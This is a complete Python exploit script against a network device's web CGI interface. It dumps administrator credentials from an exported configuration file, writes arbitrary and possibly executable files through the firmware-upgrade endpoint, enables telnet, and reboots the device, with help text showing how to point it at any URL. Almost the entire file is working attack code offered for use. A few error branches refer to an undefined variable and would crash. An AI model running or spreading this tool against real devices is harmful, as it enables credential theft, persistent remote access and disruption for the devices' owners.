import base64
import struct
import sys
import urllib3
import requests
import io

from lib import decode
from lib.box import read_admin_credentials, assemble_box

HELP_TEXT = '''To display administrator credentials:
  python3 [progname] [url]

To write arbitrary file:
  cat [source_file] | python3 [progname] [url] write [target_file_name] [upgrade_type=2]
upgrade_type 3 might allow you to write files with the executable permission

To enable telnet:
  python3 [progname] [url] telnet

To reboot the device:
  python3 [progname] [url] reboot


Valid [url]:
  http://12.34.56.78
  https://host.com
'''


# urllib is the worst library
# let's suppress the warning we never asked for, in a library we don't actually use
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)


def main():
  if len(sys.argv) < 2:
    print(HELP_TEXT.replace('[progname]', sys.argv[0]))
    exit(1)

  url = sys.argv[1]

  if not '://' in url:
    url = 'http://' + url

  if not url.endswith('/'):
    url += '/'

  if len(sys.argv) > 2 and sys.argv[2] != 'write':
    if sys.argv[2] == 'telnet':
      res = enable_telnet(url)
      if res == True:
        print("Telnet enabled")

      else:
        print("Got invalid response", resp.content)
        exit(1)

    elif sys.argv[2] == 'reboot':
      res = reboot_device(url)
      if res == True:
        print("Device should reboot")

      else:
        print("Got invalid response", resp.content)
        exit(1)

  else:
    print('Sending export request...')

    config_box = fetch_config_box(url)
    if not config_box:
      print("This method won't work on this device.")
      exit(1)

    if len(sys.argv) == 2:
      username, pw = read_admin_credentials(config_box)
      print(username, pw)

    else:
      target_file_name = sys.argv[3]
      upgrade_type = 2 if len(sys.argv) < 5 else int(sys.argv[4])
      data = sys.stdin.buffer.read()

      new_box_entries = [
        (target_file_name, data),

        # this one is so that the operation fails
        # and therefore further upgrade steps are not performed (... are there any?)
        ('/tmp', b'dummy')
      ]

      new_box = assemble_box(config_box, new_box_entries, upgrade_type)

      print('Sending upgrade request...')
      res = send_upgrade_box(url, new_box)
      if res == True:
        print("Possible success.")

      else:
        print("Got invalid response", resp.content)
        exit(1)


def fetch_config_box(url):
  resp = requests.post(url + 'CGI/System/configData/export/JUPANII.box/Record/DownLoad/ID=',
   data={'SYSCNF': 'on'},
   verify=False
  )

  if resp.status_code in (401, 501):
    return False

  return resp.content

def send_upgrade_box(url, box_data):
  resp = requests.post(url + 'CGI/FileUpload/updateFirmware/Record/DownLoad/ID=',
    files={'FILE0': ('upgrade.box', box_data)},
    verify=False
  )

  if resp.status_code == 200:
    return True

  return resp.content

def enable_telnet(url):
  resp = requests.put(url + 'CGI/System/TelnetCtrl/Record/DownLoad/ID=',
    data='<telnetCtrl><enable>true</enable></telnetCtrl>',
    headers={'Content-type': 'text/xml'},
    verify=False
  )

  if resp.status_code == 200:
    return True

  return resp.content

def reboot_device(url):
  resp = requests.put(url + 'CGI/System/reboot/Record/DownLoad/ID=',
    verify=False
  )

  if resp.status_code == 200:
    return True

  return resp.content


if __name__ == '__main__':
  main()


  